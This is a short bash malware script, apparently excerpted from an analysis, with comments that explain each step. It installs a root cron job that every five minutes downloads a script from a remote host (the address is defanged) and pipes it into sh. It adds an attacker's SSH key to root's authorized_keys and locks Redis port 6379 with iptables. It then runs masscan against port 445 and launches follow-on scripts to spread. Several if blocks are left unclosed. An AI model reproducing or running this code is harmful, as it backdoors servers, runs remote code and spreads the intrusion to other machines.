#!/bin/bash

# check how may cpu
if [ $cpunum -gt 4 ];
then
threads=`expr $cpunum / 2`
else
threads=$cpunum
# crontab entries are added for persistence
echo "*/5 * * * * curl -fsSL hxxp://xksqu4mj.fri3nds[.]in/tools/transfer.sh | sh" > /var/spool/cron/root
# installation of the attack SSH key
echo "ssh-rsa AAAAB3N ...[redacted]... Mq/jc5YLfnAnbGVbBMhuWzaWUp root@host-10-10-10-26" >> /root/.ssh/authorized_keys
# Redis via port TCP/6379
PS3=$(iptables -L | grep 6379 | wc -l)
if [ $PS3 -eq 0 ];
then
yum -y install iptables-services
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
service iptables save
/etc/init.d/iptables-persistent save
# masscan
python rangeip.py
while read line
do
    masscan -p445 $line --rate=20000 | tee -a masscan
    python order.py
    sh ebrun.sh
done < ip